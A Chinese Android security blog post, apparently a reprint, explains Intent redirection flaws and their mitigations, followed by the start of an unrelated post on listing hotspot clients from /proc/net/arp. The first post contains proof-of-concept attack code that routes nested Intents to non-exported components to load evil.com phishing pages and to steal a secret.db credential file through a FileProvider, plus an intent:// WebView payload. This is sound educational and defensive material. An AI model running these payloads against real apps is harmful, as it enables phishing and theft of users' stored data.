<h2><span id="未导出组件和非导出组件">未导出组件和非导出组件</span></h2><h3><span id="导出组件公有组件">导出组件(公有组件)</span></h3><blockquote>
<p>导出组件一般有以下三种形式：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.在AndroidManifest.xml中的组件如果显式设置了组件属性android:exported值为true;</span><br><span class="line"></span><br><span class="line">2.如果组件没有显式设置android:exported为false，但是其intent-filter以及action存在，则也为导出组件;</span><br><span class="line"></span><br><span class="line">3.API Level在17以下的所有App的provider组件的android:exported属性默认值为true，17及以上默认值为false。</span><br></pre></td></tr></table></figure>

<p>任意第三方App都可以访问导出组件。</p>
</blockquote>
<h3><span id="未导出组件专用组件">未导出组件(专用组件)</span></h3><blockquote>
<p>1.在AndroidManifest.xml中注册的组件显式设置android:exported&#x3D;”false” ;</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.WebViewActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.组件没有intent-filter, 且没有显式设置android:exported的属性值，默认为非导出的;</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.WebViewActivity&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>3.组件虽然配置了intent-filter,，但是显式设置android:exported&#x3D;”false”。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span> =<span class="string">&quot;.WebViewActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.VIEW&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">&quot;victim&quot;</span> <span class="attr">android:host</span>=<span class="string">&quot;secure_handler&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这三种组件称为专有组件或者未导出组件，三方应用无法直接调用这种组件。例如WebViewActivity中有以下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">   <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">  <span class="comment">// ... </span></span><br><span class="line">   <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">   <span class="type">String</span> <span class="variable">Url</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">   <span class="comment">// ... </span></span><br><span class="line">   webView.loadUrl(Url);</span><br></pre></td></tr></table></figure>

<p>第三方应用直接访问上述未导出的WebViewActivity组件来加载url，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.ui.WebViewActivity&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://evil.com/&quot;</span>);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>

<p>系统将会抛出java.lang.SecurityException, due to Permission Denial: WebViewActivity not exported from uid xxx.</p>
</blockquote>
<h2><span id="intent重定向">Intent重定向</span></h2><blockquote>
<p>那么如果三方APP要想访问上述非导出的WebViewActivity是不是就没有办法了呢？</p>
<p>当然不是! 其中一种常见的方式即为在本文中介绍Intent重定向， 即将Intent类的对象作为Intent 的Extras通过一个导出组件传递给非导出的组件, 以此来实现访问非导出的WebViewActivity组件。</p>
<p>原理在于，Android 组件之间传输的Intent类是实现了Parcelable的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Intent</span> <span class="keyword">implements</span> <span class="title class_">Parcelable</span>, Cloneable &#123;</span><br></pre></td></tr></table></figure>

<p>因此可以将属于Intent类的对象作为Intent的 extra数据对象传递到另一个组件中，相当于在Intent中嵌入Intent。</p>
<p>这时，如果App从不可信 Intent 的Extras字段中提取出嵌入的 Intent，然后对这个嵌入 Intent 调用 startActivity（或类似的 startService 和 sendBroadcast），这样做是很危险的； 因为攻击者原本是无法访问非导出的组件的，但是通过intent重定向，即以导出的组件作为桥即可以访问非exported的组件，达到launch anywhere或者broadcast anywhere的目的。</p>
<p>其原理如下图所示:</p>
<p><img src="/2024/01/22/Android-Internet-Redirect/1.png" alt="image"></p>
<p>Intent重定向违反了Android的安全设计，导致Android的安全访问限制（App的沙箱机制）失效。</p>
<p>Intent重定向可能导致以下安全问题：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>启动非导出组件，通过精心构造的可控的Intent参数来执行敏感操作，如果可以重写或者替换native 库，甚至还会导致任意代码执行；</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>可以获取非导出的content provider组件的content：<span class="comment">// URI的访问权限来窃取敏感文件.</span></span><br></pre></td></tr></table></figure>

<p>接下来我们分别举三个例子来说明:</p>
</blockquote>
<h3><span id="启动非导出组件">启动非导出组件</span></h3><blockquote>
<p>我们继续以上述的未导出的WebViewActivity为例子， 查找在App中是否存在导出Activity中包含了Intent重定向漏洞。刚好存在一个导出的com.victim.ui.HomeActivity组件符合预期。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onResume</span><span class="params">()</span> &#123; </span><br><span class="line">   <span class="comment">// ...  </span></span><br><span class="line">   handleIntentExtras(getIntent()); </span><br><span class="line">   <span class="comment">// 攻击者可以从外部输入任意intent</span></span><br><span class="line"> &#125;   </span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleIntentExtras</span><span class="params">(Intent intent)</span> &#123; </span><br><span class="line">    <span class="comment">// ... </span></span><br><span class="line">    <span class="type">Intent</span> <span class="variable">deeplinkIntent</span> <span class="operator">=</span> (Intent)intent.getParcelableExtra(<span class="string">&quot;extra_deep_link_intent&quot;</span>); </span><br><span class="line">    <span class="comment">// ... </span></span><br><span class="line">    <span class="keyword">if</span> (!(deeplinkIntent == <span class="literal">null</span> || <span class="built_in">this</span>.consumedDeeplinkIntent)) &#123; </span><br><span class="line">    / / ... </span><br><span class="line">        startActivity(deeplinkIntent); <span class="comment">// 危险! 打开攻击者发送的Intent</span></span><br><span class="line">     <span class="comment">// ... </span></span><br><span class="line">  &#125; </span><br><span class="line"> <span class="comment">// ... </span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>攻击者可以实现通过这个导出的HomeActivity访问任何受保护的未导出的Activity; 我们可以编写一个攻击App，将发向HomeActivity的Intent重定向到未导出的组件WebViewActivity中，让WebViewActivity的WebView加载攻击者的恶意链接，从而达到绕过Android的权限限制的目的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">next</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(); </span><br><span class="line">next.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.ui.WebViewActivity&quot;</span>); </span><br><span class="line">next.putExtra(<span class="string">&quot;extra_url&quot;</span>, <span class="string">&quot;http://evail.com&quot;</span>); <span class="comment">// 加载攻击者的钓鱼网站</span></span><br><span class="line">next.putExtra(<span class="string">&quot;extra_title&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(); </span><br><span class="line">intent .setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.ui.HomeActivity&quot;</span>); intent .putExtra(<span class="string">&quot;extra_deep_link_intent&quot;</span>, next); <span class="comment">// 嵌入Intent</span></span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="越权访问content-provider">越权访问content provider</span></h3><blockquote>
<p>除了可以访问任意组件之外，攻击者还可以访问满足以下条件的APP的Content Provider的组件：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.该组件必须是非导出的（否则可以直接攻击，无需使用我们在本文中讨论的模型）</span><br><span class="line"></span><br><span class="line">2.组件还设置了android：grantUriPermissions为true。</span><br></pre></td></tr></table></figure>

<p>同时，攻击者在实现攻击时，必须将自己设置为嵌入Intent的接收者，并设置以下标志：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1).Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION允许对提供者的持久访问（没有此标志，则访问仅为一次）</span><br><span class="line"></span><br><span class="line">2).Intent.FLAG_GRANT_PREFIX_URI_PERMISSION允许通过前缀进行URI访问。</span><br><span class="line"></span><br><span class="line">3).Intent.FLAG_GRANT_READ_URI_PERMISSION允许对提供程序进行读取操作（例如query，openFile，openAssetFile）</span><br><span class="line"></span><br><span class="line">4).Intent.FLAG_GRANT_WRITE_URI_PERMISSION允许写操作</span><br></pre></td></tr></table></figure>

<p>比如在App中有一个非导出的file provider, 该provider在其私有目录的database路径下保存了secret.db文件，该文件中保存了用户的登录账号信息。</p>
<p>该file provider的设置如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.core.content.FileProvider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;com.android.victim&quot;</span> <span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span> <span class="attr">android:resource</span>=<span class="string">&quot;@xml/provider_paths&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>为了简便起见，APP的资源文件res&#x2F;xml&#x2F;provider_paths文件的配置为</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">paths</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root-path</span> <span class="attr">name</span>=<span class="string">&quot;root&quot;</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们无法直接访问file provider， 但是可以通过Intent重定向来窃取secret.db文件。</p>
<p>payload如下:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Intent next= <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">next.setClassName(getPackageName(), <span class="string">&quot;com.Attacker.AttackerActivity&quot;</span>); </span><br><span class="line"><span class="comment">// 设置为攻击者自己的组件</span></span><br><span class="line">next.setData(Uri.parse(<span class="string">&quot;content://com.victim.localfile/secret.db&quot;</span>)); </span><br><span class="line">next.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION |   Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION  | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION); </span><br><span class="line"><span class="comment">// 添加所有可以访问content provider的读写flag</span></span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.victim.localfile&quot;</span>, <span class="string">&quot;com.victim.localfile.LoginActivity&quot;</span>); intent.putExtra(<span class="string">&quot;com.victim.extra.NEXT_INTENT&quot;</span>, next); </span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="通过webview访问任意组件">通过WebView访问任意组件</span></h3><blockquote>
<p>通常我们可以通过调用Intent.toUri（flags）方法将Intent对象转换为字符串，同时可以使用Intent.parseUri（stringUri，flags）将字符串从字符串转换回Intent。此功能通常在WebView（APP内置浏览器）中使用。APP可以解析intent:&#x2F;&#x2F; 这种类型的scheme，将URL字符串解析为Intent对象并启动相关的Activity。</p>
<p>漏洞代码示例:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, WebResourceRequest request)</span> &#123;</span><br><span class="line">    <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> request.getUrl();</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;intent&quot;</span>.equals(uri.getScheme())) &#123;</span><br><span class="line">        startActivity(Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>.shouldOverrideUrlLoading(view, request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要利用此漏洞，攻击者可以通过Intent.Uri方法创建一个WebView重定向Intent 的url，然后让WebViewActivity去加载该Url，由于在shouldOverrideUrlLoading方法中没有做完整的校验，会存在Intent重定向漏洞。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.victim&quot;</span>, <span class="string">&quot;com.victim.WebViewActivity&quot;</span>);i</span><br><span class="line">ntent.putExtra(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://evil.com/&quot;</span>);</span><br><span class="line">Log.d(<span class="string">&quot;evil&quot;</span>, intent.toUri(Intent.URI_INTENT_SCHEME)); </span><br><span class="line"><span class="comment">//&quot;intent:#Intent;component=com.victim/.WebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击代码</span></span><br><span class="line">location.href = <span class="string">&quot;intent;component=com.victim/.WebViewActivity;S.url=http%3A%2F%2Fevil.com%2F;end&quot;</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="查看此类漏洞的方法">查看此类漏洞的方法</span></h2><blockquote>
<p>如何在App中快速的找到此类漏洞呢？我们可以从以下三个方面入手:</p>
<p>1.在App中查找导出组件，并且检查该组件是否接收从外部输入的Intent对象。</p>
<p>2.在上述组件中查找对startActivity（或 startService 和 sendBroadcast）的调用，并验证其Intent组件是否是从受信任的数据对象来构造的。</p>
<p>3.查找Intent 的 getExtras方法的调用，是否有将该方法的返回值强制转换为Intent；并在使用这种嵌入的Intent之前进行了完整的校验。</p>
</blockquote>
<h2><span id="漏洞缓解方法">漏洞缓解方法</span></h2><blockquote>
<p>那么，如何缓解Intent重定向漏洞呢 ？</p>
</blockquote>
<h3><span id="方法1将受影响的应用组件设为专用组件">方法1：将受影响的应用组件设为专用组件。</span></h3><blockquote>
<p>如果受影响的应用组件不需要接收来自其他应用的 Intent，可以将此应用组件设为专用组件，只需在清单中设置 android:exported&#x3D;“false” 即可。</p>
</blockquote>
<h3><span id="方法2确保提取的intent来自可信的来源">方法2：确保提取的Intent来自可信的来源。</span></h3><blockquote>
<p>可以使用 getCallingActivity 等方法来验证源 Activity 是否可信。</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检查源 Activity 是否来自可信的包名</span></span><br><span class="line"> <span class="keyword">if</span> (getCallingActivity().getPackageName().equals(“known”)) &#123;</span><br><span class="line">   <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">   <span class="comment">// 提取嵌套的 Intent</span></span><br><span class="line">   <span class="type">Intent</span> <span class="variable">forward</span> <span class="operator">=</span> (Intent) intent.getParcelableExtra(“key”);</span><br><span class="line">   <span class="comment">// 重定向嵌套的 Intent</span></span><br><span class="line">   startActivity(forward ) ;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>注意：检查 getCallingActivity() 是否返回非null值并不足以防范此漏洞。恶意App可以为此函数提供 null 值，最好加上APP的签名校验。</p>
</blockquote>
<h3><span id="方法3确保要重定向的intent是无害的">方法3：确保要重定向的Intent是无害的。</span></h3><blockquote>
<p>需要先验证重定向的Intent，确保该 Intent</p>
<p><strong>1.不会被发送到APP的任何专用组件</strong></p>
<p><strong>2.不会被发送到外部应用的组件。如果重定向的目标是外部应用，请确保该 Intent 不会向APP的私有content provider授予URI权限。</strong></p>
<p>在重定向 Intent 之前，应用可以先使用resolveActivity等方法检查将使用哪个组件来处理该 Intent。</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line"> <span class="comment">// 提取嵌套的 Intent</span></span><br><span class="line"> <span class="type">Intent</span> <span class="variable">forward</span> <span class="operator">=</span> (Intent) intent.getParcelableExtra(“key”);</span><br><span class="line"> <span class="comment">// 获取组件名称</span></span><br><span class="line"> <span class="type">ComponentName</span> <span class="variable">name</span> <span class="operator">=</span> forward.resolveActivity(getPackageManager());</span><br><span class="line"> <span class="comment">// 检查软件包名称和类名称是否符合预期</span></span><br><span class="line"> <span class="keyword">if</span> (name.getPackageName().equals(“safe_package”) &amp;&amp;</span><br><span class="line">     name.getClassName().equals(“safe_class”)) &#123;</span><br><span class="line">   <span class="comment">// 重定向嵌套的 Intent</span></span><br><span class="line">   startActivity(forward);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>App可以使用getFlags等方法来检查 Intent 是否会授予 URI 权限。应用还可以使用removeFlags撤消 URI 权限的授予。</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 提取嵌套的 Intent</span></span><br><span class="line"> <span class="type">Intent</span> <span class="variable">forward</span> <span class="operator">=</span> (Intent) intent.getParcelableExtra(“key”);</span><br><span class="line"> <span class="comment">// 获取标记</span></span><br><span class="line"> <span class="type">int</span> <span class="variable">flags</span> <span class="operator">=</span> forward.getFlags();</span><br><span class="line"> <span class="comment">// 检查嵌套的 Intent 不能授予 URI 读写权限</span></span><br><span class="line"> <span class="keyword">if</span> (( flags &amp; Intent.FLAG_GRANT_READ_URI_PERMISSION == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">     (flags &amp; Intent.FLAG_GRANT_WRITE_URI_PERMISSION == <span class="number">0</span>)) &#123;</span><br><span class="line">    / / 重定向嵌套的 Intent</span><br><span class="line">       <span class="title function_">startActivity</span><span class="params">(forward)</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="参考">参考</span></h2><blockquote>
<p>[1] Intent Redirection Vulnerability <a target="_blank" rel="noopener" href="https://support.google.com/faqs/answer/9267555?hl=en">https://support.google.com/faqs/answer/9267555?hl=en</a></p>
<p>[2] #272044 Android - Access of some not exported content providers<a target="_blank" rel="noopener" href="https://hackerone.com/reports/272044[3]">https://hackerone.com/reports/272044[3]</a> #200427 Access of Android protected components via embedded intent<a target="_blank" rel="noopener" href="https://hackerone.com/reports/200427[4]">https://hackerone.com/reports/200427[4]</a> Intent.toUri<a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/content/Intent#toURI()">https://developer.android.com/reference/android/content/Intent#toURI()</a></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2023/09/02/Android-WIFI/">
                Android 开启个人热点时 获取连接人数以及连接上的设备信息
            </a>
        </h2>
    
    <time>
        Sep 2, 2023
    </time>
    <section class="content">
        <h1><span id="android-开启个人热点时-获取连接人数以及连接上的设备信息">Android 开启个人热点时 获取连接人数以及连接上的设备信息</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/king4148/article/details/70156760">多看一二</a> 并作补充</p>
</blockquote>
<h2><span id="起因">起因</span></h2><blockquote>
<p>最近在开发过程当中，遇到一个需求 ，开启个人热点后需要知道有多少人连上了这个热点 以及这些设备的信息</p>
<p>经过一段时间的摸索和反复的查阅资料，有了下面的代码和解决办法：</p>
<p>首先 连接热点的所有信息都保存在proc&#x2F;net&#x2F;arp下面 用re文件管理器可以查看一下</p>
<p>会发现 里面有连接的设备的 ip mac地址 等等  </p>
<p>好了 那么问题就简单了</p>
<p>直接贴代码：</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">ArrayList&lt;ClientScanResult&gt; result = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    br = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;/proc/net/arp&quot;</span>));<span class="comment">//读取这个文件</span></span><br><span class="line">    String ss=br.toString();</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        String[] splitted = line.split(<span class="string">&quot; +&quot;</span>);<span class="comment">//将文件里面的字段分割开来</span></span><br><span class="line">        <span class="keyword">if</span> (splitted.length &gt;= <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="comment">// Basic sanity check</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">mac</span> <span class="operator">=</span> splitted[<span class="number">3</span>];<span class="comment">// 文件中分别是IP address  HW type Flags HW address mask Device </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//然后我们拿取HW address  也就是手机的mac地址进行匹配  如果有 就证明是手机</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (mac.matches(<span class="string">&quot;..:..:..:..:..:..&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isReachable</span> <span class="operator">=</span> InetAddress.getByName(splitted[<span class="number">0</span>]).isReachable(reachableTimeout);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!onlyReachables || isReachable) &#123;</span><br><span class="line"></span><br><span class="line">                    result.add(<span class="keyword">new</span> <span class="title class_">ClientScanResult</span>(splitted[<span class="number">0</span>], splitted[<span class="number">3</span>], splitted[<span class="number">5</span>], isReachable));<span class="comment">//最后如果能匹配 那就证明是连接了热点的手机  加到这个集合里 里面有所有需要的信息</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    CandyLog.e(e.getMessage());</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (br != <span class="literal">null</span>) &#123;</span><br><span class="line">            br.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span 